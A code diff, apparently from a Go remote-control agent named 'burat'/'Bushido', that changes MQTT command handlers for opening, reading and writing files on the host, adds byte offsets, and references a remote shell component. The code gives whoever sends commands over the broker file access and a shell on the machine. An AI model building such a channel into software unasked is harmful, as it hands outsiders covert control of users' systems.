@@ -64,7 +64,7 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
 		var packet packets.FilerwOpenPacket
 		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().FileRW.Open(packet.Id, packet.Path, packet.Mode, packet.Size)
+		burat.Bushido().FileRW.Open(packet.Id, packet.Path)
 	})
 
 	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
@@ -76,13 +76,13 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
 		var packet packets.FilerwReadPacket
 		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().FileRW.Read(packet.Id, packet.Length)
+		burat.Bushido().FileRW.Read(packet.Id, packet.Length, packet.Offset)
 	})
 
 	burat.AddTopicCallback("filerw_cmd_write", func (client mqtt.Client, message mqtt.Message) {
 		var packet packets.FilerwWritePacket
 		burat.Decryse(message.Payload(), &packet)
-		burat.Bushido().FileRW.Write(packet.Id, packet.Data)
+		burat.Bushido().FileRW.Write(packet.Id, packet.Data, packet.Offset)
 	})
 
 	burat.Bushido().RemoteShell.OnOpen(func (id string) {
@@ -126,10 +126,7 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 			if f.Id() == id {
 				packet := burat.Seen(packets.FilerwOnOpenPacket {
 					Id: id,
-					Path: f.Path() ,
-					Mode: f.Mode(),
-					Size: f.Size(),
-					BytesIO: f.BytesIO(),
+					Path: f.Path(),
 				})
 				burat.Publish(id, "filerw", 2, true, packet)
 			}
@@ -141,44 +138,16 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		burat.Publish(id, "filerw", 2, true, nil)
 	})
 
-	burat.Bushido().FileRW.OnRead(func (id string, data []byte) {
+	burat.Bushido().FileRW.OnRead(func (id string, data []byte, offset int) {
 		fmt.Println("filerw.read", id, data)
-		packet := burat.Seen(packets.FilerwOnReadPacket { Id: id, Data: data })
+		packet := burat.Seen(packets.FilerwOnReadPacket { Id: id, Data: data, Offset: offset })
 		burat.Publish(id, "filerw_evt_read", 2, false, packet)
-
-		files := burat.Bushido().FileRW.Files()
-		for _, f := range files {
-			if f.Id() == id {
-				packet := burat.Seen(packets.FilerwOnOpenPacket {
-					Id: id,
-					Path: f.Path() ,
-					Mode: f.Mode(),
-					Size: f.Size(),
-					BytesIO: f.BytesIO(),
-				})
-				burat.Publish(id, "filerw", 2, true, packet)
-			}
-		}
 	})
 
-	burat.Bushido().FileRW.OnWrite(func (id string, length int) {
+	burat.Bushido().FileRW.OnWrite(func (id string, length int, offset int) {
 		fmt.Println("filerw.write", id, length)
-		packet := burat.Seen(packets.FilerwOnWritePacket { Id: id, Length: length })
+		packet := burat.Seen(packets.FilerwOnWritePacket { Id: id, Length: length, Offset: offset })
 		burat.Publish(id, "filerw_evt_write", 2, false, packet)
-
-		files := burat.Bushido().FileRW.Files()
-		for _, f := range files {
-			if f.Id() == id {
-				packet := burat.Seen(packets.FilerwOnOpenPacket {
-					Id: id,
-					Path: f.Path() ,
-					Mode: f.Mode(),
-					Size: f.Size(),
-					BytesIO: f.BytesIO(),
-				})
-				burat.Publish(id, "filerw", 2, true, packet)
-			}
-		}
 	})
 
 	burat.Bushido().FileRW.OnError(func (id string, error error) {
